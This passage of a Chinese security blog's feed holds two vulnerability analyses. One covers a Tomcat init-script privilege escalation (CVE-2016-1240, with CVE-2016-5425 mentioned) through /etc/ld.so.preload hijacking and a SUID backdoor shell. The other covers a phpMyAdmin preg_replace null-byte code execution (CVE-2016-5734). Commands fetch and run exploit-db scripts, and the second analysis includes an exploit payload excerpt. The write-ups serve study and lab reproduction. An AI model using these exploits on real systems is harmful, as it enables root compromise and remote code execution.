&lt;p&gt;如果等不了的话可以进入active模式，121到155行是前期利用环境的准备。先说一下作者整体的利用思路：借助init脚本中的缺陷把&lt;a href=&quot;http://liaoph.com/linux-shared-libary/&quot;&gt;/etc/ld.so.preload&lt;/a&gt;的所有者改为tomcat，而/etc/ld.so.preload和LD_PRELOAD的作用一样，我们将自定义的函数编译成so文件后再写入/etc/ld.so.preload中，即可完成对标准C函数的覆盖，进而实现我们想要的效果。&lt;/p&gt;

&lt;p&gt;147到149行是先copy一个后面shell到/tmp目录下，不过权限还比较低。151到155行则是检查/etc/ld.so.preload存在，为了安全起见存在的话退出脚本。122到145行在编译/tmp/privesclib.so文件，覆盖掉标准的geteuid函数，在函数内部会检测程序的euid，当euid为0时也就是root权限运行时会将之前的后面shell改为root用户和root组，更改后门shell的权限并设置SUID，最后删除/etc/ld.so.preload文件。&lt;/p&gt;

&lt;p&gt;这里需要补充一下SUID的知识：linux内核主要是根据euid和egid来确定进程对资源的访问权限的，当linux的二进制文件执行时，会使用geteuid函数来获得euid。一个进程如果没有SUID或SGID位，则euid=uid egid=gid；如果一个程序设置了SUID，则euid和egid变成被运行的程序的所有者的uid和gid。也就是说其他人运行了设置有SUID的程序，则该程序会以程序所有者的身份被运行，我们的passwd程序就是这样的一个例子。（更多相关参考可以看&lt;a href=&quot;http://www.cnblogs.com/fhefh/archive/2011/09/20/2182155.html&quot;&gt;这里&lt;/a&gt;）如果成功执行了我们覆盖的geteuid函数，后门shell的权限则会变成rws，当任何人运行该shell时，shell都会以root的身份被执行，我们的权限也就提升了。&lt;/p&gt;

&lt;p&gt;下面就需要创造调用覆盖函数的机会。158到174行利用缺陷，在等待tomcat或主机重启后将/etc/ld.so.preload的所有者改为tomcat用户，然后向其中写入我们之前编译的/tmp/privesclib.so文件。最后调用&lt;a href=&quot;http://www.jb51.net/article/48390.htm&quot;&gt;sudo&lt;/a&gt;程序，因为sudo的权限为rws所有者为root，所以在调用过程中euid是为0的，我们的覆盖函数就发挥的作用，更改后门shell的权限。187到203行则是检测后门shell的权限是否更改成功并且调用，这样整个权限提升的过程就完成了。&lt;/p&gt;

&lt;h1 id=&quot;x04-&quot;&gt;0x04 漏洞复现&lt;/h1&gt;

&lt;p&gt;直接下载作者提供的脚本还不能用，需要编辑一下，而且编译环境需要gcc，具体如下:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install gcc
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.exploit-db.com/download/40450
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sed -n &lt;span class=&quot;s1&quot;&gt;&amp;#39;93, 296p&amp;#39;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;40450&lt;/span&gt; &amp;gt; exploit.sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod &lt;span class=&quot;m&quot;&gt;777&lt;/span&gt; exploit.sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install dos2unix
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dos2unix exploit.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;为了模拟攻击者拿到了tomcat的shell和创造机会使tomcat重启，我将tomcat的shell设置了一下，并且使用sleep将重启服务后置几秒然后运行攻击脚本，具体如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo usermod -s /bin/bash tomcat7
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sleep &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo service tomcat7 restart &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo su tomcat -c &lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/bash exploit.sh /var/log/tomcat7/catalina.out&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161012/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;cve-2016-5425&quot;&gt;CVE-2016-5425&lt;/h1&gt;

&lt;p&gt;10月10号freebuf上有一篇文章通报本文所述的漏洞，然后就有人评论说“还是我fedora小白鼠闷声发大财.”。然而CVE的作者也在10月10号提交了&lt;a href=&quot;https://www.exploit-db.com/exploits/40488/&quot;&gt;Apache Tomcat 8/7/6 (RedHat-Based Distros) - Privilege Escalation&lt;/a&gt;，也就是CVE-2016-5425，影响所有基于RedHat的发行版本，当然fedora也包含在内，想一想也是蛮搞笑的单纯。这个漏洞依旧是安装包中文件权限设置不当，使得tomcat组对/usr/lib/tmpfiles.d/tomcat.conf有写权限，因此可对该文件写入&lt;a href=&quot;&quot;&gt;相应的指令&lt;/a&gt;，一旦主机重启就会以root权限执行写入的命令，即可反弹shell也可留下后面，更多的内容见&lt;a href=&quot;http://www.freebuf.com/news/116412.html&quot;&gt;这里&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;这两次CVE的成功都是建立在主机重启之后，在主机down掉时我们该去排查相应的原因，而不是盲目的重启。当我们的生活因为某种原因down掉时，是不是应该去反省一下自己寻找原因，而不是随意排解后的无脑前行。你愿意被生活exploit吗？&lt;/p&gt;

</description>
        
        <pubDate>Wed, 12 Oct 2016 14:00:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/cve-2016-1240-analysis.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/cve-2016-1240-analysis.html</guid>
      </item>
      
    
      
      <item>
        <title>CVE-2016-5734 phpMyAdmin认证用户远程代码执行漏洞分析</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

&lt;p&gt;CVE-2016-5734在&lt;a href=&quot;https://www.exploit-db.com/exploits/40185/&quot;&gt;exploit-db&lt;/a&gt;上也就是 phpMyAdmin 4.6.2 - Authenticated Remote Code Execution ，意即phpMyAdmin认证用户的远程代码执行，根据&lt;a href=&quot;https://www.phpmyadmin.net/security/PMASA-2016-27/&quot;&gt;描述&lt;/a&gt;可知受影响的phpMyAdmin所有的 4.6.x 版本（直至 4.6.3），4.4.x 版本（直至 4.4.15.7），和 4.0.x 版本（直至 4.0.10.16）。 CVE的作者利用在php 5.4.7之前的版本中&lt;code&gt;preg_replace&lt;/code&gt;函数对空字节的错误处理Bug，使注入的代码可远程执行。本文将会对此CVE进行相关分析。&lt;/p&gt;

&lt;h1 id=&quot;x01-&quot;&gt;0x01 环境搭建&lt;/h1&gt;

&lt;h2 id=&quot;init&quot;&gt;init&lt;/h2&gt;

&lt;p&gt;在这里我会使用LAMP进行漏洞的调试和复现，首先在VirtualBox上安装Ubuntu 14.04 Server，安装成功后我们替换一下apt的源方便之后环境的安装与下载，命令如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc/apt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo mv sources.list sources.list.bak
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo vim sources.list

&lt;span class=&quot;c&quot;&gt;#我们写入aliyun的源&lt;/span&gt;

deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse

&lt;span class=&quot;c&quot;&gt;#最后再update一下&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get update
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;apache&quot;&gt;apache&lt;/h2&gt;

&lt;p&gt;紧接着我们apt安装apache&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install apache2 apache2-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;mysql&quot;&gt;mysql&lt;/h2&gt;

&lt;p&gt;再安装mysql&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install mysql-server mysql-client&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;php&quot;&gt;php&lt;/h2&gt;

&lt;p&gt;最后来啃啃php。由于php Bug的报告者使用的是php 5.4.0版本，我们就也安装5.4.0版本进行测试，&lt;code&gt;apt-get&lt;/code&gt;直接安装肯定是不行了，我们就下载源码进行安装吧，首先安装一下必要的编译环境&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install build-essential&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;再安装在编译过程中对应选项所需要的库（你也可以根据自己的需求进行选择）&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install libcurl4-openssl-dev libedit-dev libsqlite3-dev libssl-dev libxml2-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;然后我们就来下载源码进行编译吧&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://museum.php.net/php5/php-5.4.0.tar.bz2
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tar jxf php-5.4.0.tar.bz2
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;php-5.4.0/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./configure --with-apxs2 --enable-ftp --enable-mbstring --with-curl --with-openssl --with-zlib --with-libedit --with-mysql --enable-embedded-mysqli
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo make&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;可是在编译过程当中出现了&lt;code&gt;make: *** [ext/dom/node.lo] Error 1&lt;/code&gt;的错误，在&lt;a href=&quot;https://github.com/phpbrew/phpbrew/issues/249&quot;&gt;github&lt;/a&gt;上也有人给了解决方案&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl -s https://mail.gnome.org/archives/xml/2012-August/txtbgxGXAvz4N.txt &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; patch -p0
patching file ext/dom/node.c
patching file ext/dom/documenttype.c
patching file ext/simplexml/simplexml.c

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo make &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo make install&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;至此编译的过程已经完成，这里还需要配置一下apache来解析php。在&lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt;的最后加上&lt;code&gt;AddHandler application/x-httpd-php .php&lt;/code&gt;，然后&lt;code&gt;sudo service apache restart&lt;/code&gt;重启apache，查看是否能够解析php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x02-&quot;&gt;0x02 核心剖析&lt;/h1&gt;

&lt;p&gt;我们LAMP的环境搭建好了，让我们来看看这个PHP版本的Bug是怎么一回事。漏洞描述中有说php是在5.4.7中修复了该Bug，我们可以在php的&lt;a href=&quot;http://php.net/ChangeLog-5.php#5.4.7&quot;&gt;changelog&lt;/a&gt;中查找其修复的Bug，据此定位到和该CVE相关的&lt;a href=&quot;https://bugs.php.net/bug.php?id=55856&quot;&gt;#55856 preg_replace should fail on trailing garbage&lt;/a&gt;问题。&lt;/p&gt;

&lt;p&gt;在php代码中，和&lt;code&gt;mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;amp;$count ]] )&lt;/code&gt;函数相关的代码执行漏洞通常是使用了&lt;a href=&quot;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&quot;&gt;e修饰符&lt;/a&gt;，我们的demo如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/e&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在&lt;code&gt;preg_replace&lt;/code&gt;函数当中，加了e修饰符之后，在subject中匹配到pattern后会执行replacement中的代码，将执行结果进行替换，我们这里可以使用php的&lt;code&gt;system&lt;/code&gt;函数，可以直接输出命令执行的结果，如图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果我们的demo变成了如下的代码，还会有漏洞吗&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;55856这个Bug就在这里发挥了作用，当php版本小于5.4.7时，可以向pattern中注入空字符产生截断，并传入e修饰符，使得我们可控的replacement代码执行，如图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x03-&quot;&gt;0x03 漏洞分析&lt;/h1&gt;

&lt;p&gt;exploit-db中提供的Vulnerable App是phpMyAdmin 4.6.2，下载下来直接解压后访问的结果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在&lt;a href=&quot;https://github.com/phpmyadmin/phpmyadmin/blob/RELEASE_4_6_2/libraries/common.inc.php#L57&quot;&gt;/libraries/common.inc.php&lt;/a&gt;的57行也可以知道4.6.x的版本要求php的版本是要大于5.5.0的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而在phpMyAdmin 4.4.15.6中则要求php版本大于5.3.0即可，我们就下载4.4.15.6版本的进行分析测试&lt;/p&gt;

&lt;p&gt;根据&lt;a href=&quot;https://www.exploit-db.com/download/40185&quot;&gt;exp&lt;/a&gt;我们可以知道此脚本利用的要求有两点&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;知道phpMyAdmin的路径，并且可以使用账号密码登录成功&lt;/li&gt;
  &lt;li&gt;知道对应db的table，或者在db中有创建table的权限&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;其次，在exp的以下代码中我们能够知道漏洞的触发点在于tbl_find_replace.php脚本中&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;# build exploit&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;db&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;table&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;goto&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;sql.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;find&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;0/e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;replaceWith&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;columnIndex&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;useRegex&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;on&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Go&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;quot;ajax_request&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;url_to_pma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/tbl_find_replace.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;tbl_find_replace.php的24行中，将POST的&lt;code&gt;find&lt;/code&gt;和&lt;code&gt;replaceWwith&lt;/code&gt;传入到了&lt;code&gt;$table_search&lt;/code&gt;的&lt;code&gt;getReplacePreview&lt;/code&gt;方法中&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$table_search&lt;/code&gt;是&lt;code&gt;PMA_TableSearch&lt;/code&gt;对象实例化的结果,而&lt;code&gt;PMA_TableSearch&lt;/code&gt;在&lt;code&gt;libraries/TableSearch.class.php&lt;/code&gt;中进行了定义，我们定位到&lt;code&gt;libraries/TableSearch.class.php&lt;/code&gt;的1430行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;getReplacePreview&lt;/code&gt;方法中，由于exp中设定了&lt;code&gt;$useRegex&lt;/code&gt;的值，所以参数继续传递到&lt;code&gt;_getRegexReplaceRows&lt;/code&gt;方法中，定位到1388行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在1408~1413行当中，&lt;code&gt;preg_replace(&quot;/&quot; . $find . &quot;/&quot;, $replaceWith, $row[0]);&lt;/code&gt;很经典地还原了55856 Bug的场景，exp中通过&lt;code&gt;        &quot;find&quot;: &quot;0/e\0&quot;,&quot;replaceWith&quot;: payload,&lt;/code&gt;的POST提交，空字节截断并传入e修饰符进而执行我们的payload，也将替换的结果进行了回传，最终的复现如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160921/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x04-&quot;&gt;0x04 总结&lt;/h1&gt;

&lt;p&gt;个人感觉此CVE的利用还是有些版本和用户信息的要求，漏洞环境的搭建虽然有些小坑，但是根据exp逆向追踪漏洞根源的过程比较简单，在php Bug下所造成的漏洞还需要多积累相关经验去实践去挖掘&lt;/p&gt;

</description>
        
        <pubDate>Wed, 21 Sep 2016 15:00:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/cve-2016-5734-analysis.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/cve-2016-5734-analysis.html</guid>
      </item>
      
